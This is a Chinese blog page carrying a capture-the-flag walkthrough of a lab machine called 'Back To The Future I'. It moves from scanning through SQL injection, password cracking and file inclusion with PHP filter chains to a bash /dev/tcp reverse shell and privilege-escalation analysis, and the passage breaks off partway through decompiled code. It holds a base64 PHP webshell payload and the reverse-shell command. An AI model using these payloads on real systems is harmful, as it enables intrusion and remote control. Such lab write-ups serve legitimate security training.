<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-6fbfdb3e812309fb.js" defer=""></script><script src="/_next/static/BhT_uiZI9tLUHe-4nDcBE/_buildManifest.js" defer=""></script><script src="/_next/static/BhT_uiZI9tLUHe-4nDcBE/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsBack To The Future I","contentHtml":"\u003ch1\u003eBack To The Future I\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/119\"\u003ehttps://labs.thehackerslabs.com/machine/119\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Back_To_The_Future_I nmap -sT -min-rate 10000 -p- 192.168.56.94\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:01 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.94\nHost is up (0.00056s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nMAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 3.52 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Back_To_The_Future_I nmap -sT -A -p 21,22,80,3306 192.168.56.94\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:05 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.94\nHost is up (0.00051s latency).\n\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 f7:c5:4a:ca:73:0e:21:ed:9f:5d:7e:35:65:f6:9f:b2 (ECDSA)\n|_  256 \u003cspan class=\"hljs-built_in\"\u003efc\u003c/span\u003e:f2:e9:1a:ae:3c:da:94:f5:db:11:b2:8b:5c:7f:32 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62\n|_http-title: Did not follow redirect to http://hillvalley.thl/\n|_http-server-header: Apache/2.4.62 (Debian)\n3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)\nMAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: Host: _default_; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.51 ms 192.168.56.94\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 9.68 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eFTP\u003c/code\u003e 匿名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Back_To_The_Future_I ftp 192.168.56.94\nConnected to 192.168.56.94.\n220 (vsFTPd 3.0.3)\nName (192.168.56.94:root): anonymous\n530 Permission denied.\nftp: Login failed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eHTTP\u003c/code\u003e 服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看源码能找到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e  \u0026#x3C;!-- ¡El reloj de la torre no tiene nada que ver! ¿O sí? --\u003e\n  \u0026#x3C;!-- 塔钟跟这事儿一点关系都没有！或者说，有关系？--\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e目录爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Back_To_The_Future_I feroxbuster --url http://hillvalley.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x a\nsp,php,txt,zip                                                                                  \n                                                                                                \n ___  ___  __   __     __      __         __   ___                           \n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__                                                                                                                                               \n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___                                                                                                                                              \nby Ben \u003cspan class=\"hljs-string\"\u003e\"epi\"\u003c/span\u003e Risher 🤓                 ver: 2.11.0                                                                                                                                              \n───────────────────────────┬──────────────────────                                                                                                                                              \n 🎯  Target Url            │ http://hillvalley.thl/\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n 💲  Extensions            │ [asp, php, txt, zip]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      175l      325w     3150c http://hillvalley.thl/css/styles.css\n200      GET       69l      176w     2948c http://hillvalley.thl/index.php\n200      GET       69l      176w     2948c http://hillvalley.thl/\n200      GET        3l       28w      240c http://hillvalley.thl/about.php\n302      GET        0l        0w        0c http://hillvalley.thl/admin.php =\u003e index.php\n301      GET        9l       28w      314c http://hillvalley.thl/css =\u003e http://hillvalley.thl/css/\n301      GET        9l       28w      314c http://hillvalley.thl/img =\u003e http://hillvalley.thl/img/\n200      GET      140l      809w    61123c http://hillvalley.thl/img/flux_capacitor.png\n301      GET        9l       28w      313c http://hillvalley.thl/js =\u003e http://hillvalley.thl/js/\n200      GET       23l       61w      838c http://hillvalley.thl/js/index.js\n302      GET        0l        0w        0c http://hillvalley.thl/logout.php =\u003e index.php\n200      GET        0l        0w        0c http://hillvalley.thl/config.php\n200      GET        6l       25w      216c http://hillvalley.thl/logs.php\n200      GET     9932l    58762w  4734247c http://hillvalley.thl/img/delorean.png\n200      GET       28l      143w     1121c http://hillvalley.thl/time_machine.php\n[####################] - 79s  1038210/1038210 0s      found:15      errors:0      \n[####################] - 78s  1038145/1038145 13250/s http://hillvalley.thl/ \n[####################] - 0s   1038145/1038145 94376818/s http://hillvalley.thl/css/ =\u003e Directory listing (add --scan-dir-listings to scan)\n[####################] - 7s   1038145/1038145 146548/s http://hillvalley.thl/img/ =\u003e Directory listing (add --scan-dir-listings to scan)\n[####################] - 0s   1038145/1038145 37076607/s http://hillvalley.thl/js/ =\u003e Directory listing (add --scan-dir-listings to scan)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eabout.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003elogs.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003etime_machine.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e？EI Psy Kongroo ~\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e没找到信息，尝试爆破登录框，也是不成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试一下登录框\u003c/p\u003e\n\u003cp\u003e发现存在 \u003ccode\u003eSQL\u003c/code\u003e 注入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eSQL 注入\u003c/h2\u003e\n\u003cp\u003e直接上 \u003ccode\u003eSQLmap\u003c/code\u003e ，测试出来 延时注入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e将数据都爆出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecurrent user: \u003cspan class=\"hljs-string\"\u003e'marty@localhost'\u003c/span\u003e\ncurrent database: \u003cspan class=\"hljs-string\"\u003e'hillvalley'\u003c/span\u003e\n\nDatabase: hillvalley\n[1 table]\n+-------+\n| \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e |\n+-------+\n\n+----+--------------------------------------------------------------+----------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | password                                                     | username |\n+----+--------------------------------------------------------------+----------+\n| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |\n+----+--------------------------------------------------------------+----------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将密码进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Back_To_The_Future_I john --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e                 \nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\nandromeda        (?)     \nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到一个账户 \u003ccode\u003emarty\u003c/code\u003e:\u003ccode\u003eandromeda\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e文件包含\u003c/h2\u003e\n\u003cp\u003e登录进去后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到一些关于密码信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e我实施了一项基本的安全措施来保护关键的项目文件。\n我使用了与我的时光机和第一次跳跃的日期相关的密码。\n\n马蒂永远不会忘记那一天。\n\n——医生\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们还注意到\u003ccode\u003eURL\u003c/code\u003e是貌似是包含文件的，我们尝试一下包含一下别的文件\u003c/p\u003e\n\u003cp\u003e成功将 \u003ccode\u003e/etc/passwd\u003c/code\u003e 包含出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以直接将 \u003ccode\u003euser.txt\u003c/code\u003e 给包含出来\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但我们的目的是拿到 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e测试伪协议是否可以使用\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们尝试通过 \u003ccode\u003ephp://filter/write\u003c/code\u003e 来写入文件，但是并没有成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ephp://filter/write=convert.base64-decode/resource=shell.php\u0026#x26;data=PD9waHAgZXZhbChzeXN0ZW0oJF9QT1NUWyJ4Il0pKTtwaHBpbmZvKCk7Pz4=\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过：\u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md\"\u003ehttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e能到一个工具 \u003cstrong\u003ePHP filter chain generator\u003c/strong\u003e：\u003ca href=\"https://github.com/synacktiv/php_filter_chain_generator\"\u003ehttps://github.com/synacktiv/php_filter_chain_generator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e生成 \u003ccode\u003epayload\u003c/code\u003e：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython3 php_filter_chain_generator.py --chain \u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;?php phpinfo(); ?\u003e  '\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e生成反弹 \u003ccode\u003eshell\u003c/code\u003e 的代码：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\tpython3 php_filter_chain_generator.py --chain \u003cspan class=\"hljs-string\"\u003e'\u0026#x3C;?php eval(system($_GET[\"x\"])); ?\u003e  '\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试代码执行\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/bin/bash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.5/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到立足点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eTo Marty\u003c/h2\u003e\n\u003cp\u003e查看配置文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@hillvalley:/var/www/project/app$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e config.php \n\u0026#x3C;?php\n\u003cspan class=\"hljs-variable\"\u003e$host\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"localhost\"\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$user\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"marty\"\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$pass\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"t1m3travel\"\u003c/span\u003e;\n\u003cspan class=\"hljs-variable\"\u003e$db\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e\"hillvalley\"\u003c/span\u003e;\n\n\u003cspan class=\"hljs-variable\"\u003e$conn\u003c/span\u003e = mysqli_connect(\u003cspan class=\"hljs-variable\"\u003e$host\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$user\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$pass\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$db\u003c/span\u003e);\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!\u003cspan class=\"hljs-variable\"\u003e$conn\u003c/span\u003e) {\n    die(\u003cspan class=\"hljs-string\"\u003e\"Connection failed: \"\u003c/span\u003e . mysqli_connect_error());\n}\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到数据库账号密码，因为用户名是 \u003ccode\u003emarty\u003c/code\u003e ，我们顺便碰撞一下密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@hillvalley:/var/www/project/app$ su marty\nPassword: \nmarty@hillvalley:/var/www/project/app$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功切换到用户\u003ccode\u003eMarty\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我们写入 \u003ccode\u003eSSH\u003c/code\u003e 公钥，使用公钥进行登录\u003c/p\u003e\n\u003ch2\u003eTo docbrown\u003c/h2\u003e\n\u003cp\u003e家目录下的隐藏文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emarty@hillvalley:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e .flux_notes \nTiempos inestables... aún necesito arreglar el runner para la \u003cspan class=\"hljs-built_in\"\u003epr\u003c/span\u003eóxima prueba.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e时间不稳定...仍然需要修复运行器以进行下一次测试。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e能直接看\u003ccode\u003edocbrown\u003c/code\u003e的家目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emarty@hillvalley:/home/docbrown$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 88\ndrwxr-xr-x 15 docbrown docbrown 4096 Jul 15 10:45 .\ndrwxr-xr-x  4 root     root     4096 Jul 12 15:49 ..\nlrwxrwxrwx  1 root     root        9 Jul 13 16:50 .bash_history -\u003e /dev/null\n-rw-r--r--  1 docbrown docbrown  220 Jul 11 22:04 .bash_logout\n-rw-r--r--  1 docbrown docbrown 3662 Jul 12 20:23 .bashrc\ndrwx------ 10 docbrown docbrown 4096 Jul 11 22:27 .cache\ndrwx------  9 docbrown docbrown 4096 Jul 12 20:41 .config\n-rw-r--r--  1 docbrown docbrown 5290 Jul 11 22:04 .face\nlrwxrwxrwx  1 docbrown docbrown    5 Jul 11 22:04 .face.icon -\u003e .face\n-rw-r--r--  1 docbrown docbrown  110 Jul 13 14:10 .flux_hint\ndrwx------  4 docbrown docbrown 4096 Jul 11 22:08 .\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e\ndrwx------  4 docbrown docbrown 4096 Jul 11 22:27 .mozilla\n-rw-r--r--  1 docbrown docbrown  807 Jul 11 22:04 .profile\n-rw-------  1 docbrown docbrown  817 Jul 13 12:52 .viminfo\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Desktop\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Documents\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Downloads\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Music\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Pictures\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Public\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Templates\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Videos\ndrwxrwxrwx  2 docbrown docbrown 4096 Jul 12 20:49 docs\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e.flux_hint\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emarty@hillvalley:/home/docbrown$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e .flux_hint \nHe estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cblockquote\u003e\n\u003cp\u003e我一直在研究一种同步系统脚本的新方法。分分秒秒……精准无误。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e提到了同步系统脚本，我们上\u003ccode\u003epspy\u003c/code\u003e看看\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e注意到 \u003cstrong\u003e\u003ccode\u003e/usr/local/bin/flux_admin.sh\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e但是根目录中也是没有\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emarty@hillvalley:/usr/local/bin$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 40\ndrwxr-xr-x  2 root root  4096 Jul 14 21:53 .\ndrwxr-xr-x 10 root root  4096 Jul 11 21:56 ..\n-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner\n-rwx------  1 root root 16296 Jul 14 20:44 time_daemon\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上 \u003ccode\u003elinpeas.sh\u003c/code\u003e 看看\u003c/p\u003e\n\u003cp\u003e可以注意到如下信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eFiles with capabilities (limited to 50): \n/usr/local/bin/backup_runner cap_setuid=ep \n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep\n/usr/bin/ping cap_net_raw=ep \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e当程序 \u003ccode\u003ebackup_runner\u003c/code\u003e 运行时一些拥有 \u003ccode\u003esetuid\u003c/code\u003e 权限，可以以其他用户权限运行\u003c/p\u003e\n\u003cp\u003e我们将其拉出去分析一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char s[264]; // [rsp+10h] [rbp-110h] BYREF\n  const char *v5; // [rsp+118h] [rbp-8h]\n\n  \u003cspan 